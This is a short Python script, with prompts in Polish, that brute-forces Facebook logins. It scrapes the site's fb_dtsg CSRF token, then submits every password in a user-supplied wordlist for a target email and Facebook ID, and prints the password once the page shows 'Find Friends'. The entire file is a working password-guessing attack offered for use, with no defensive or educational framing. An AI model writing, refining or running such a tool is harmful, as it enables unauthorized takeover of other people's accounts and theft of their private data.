

import requests
import re

def get_csrf_token(session):
    response = session.get("https://www.facebook.com/")
    match = re.search(r'name="fb_dtsg" value="([^"]+)"', response.text)
    if match:
        return match.group(1)
    else:
        print("Nie udało się uzyskać tokenu CSRF.")
        return None

def brute_force(email, fb_id, passwords):
    with requests.Session() as session:
        csrf_token = get_csrf_token(session)
        if csrf_token:
            for password in passwords:
                data = {
                    "email": email,
                    "pass": password,
                    "fb_dtsg": csrf_token,
                    "login": "Zaloguj się"
                }

                response = session.post(f"https://www.facebook.com/{fb_id}", data=data)
                if "Find Friends" in response.text:
                    print(f"Hasło znalezione: {password}")
                    break
                else:
                    print(f"Błędne hasło: {password}")

if __name__ == "__main__":
    email = input("Podaj adres e-mail (jako nazwę użytkownika): ")
    fb_id = input("Podaj identyfikator Facebooka: ")
    password_file = input("Podaj nazwę pliku z hasłami: ")

    with open(password_file, "r") as file:
        passwords = [line.strip() for line in file]

    brute_force(email, fb_id, passwords)
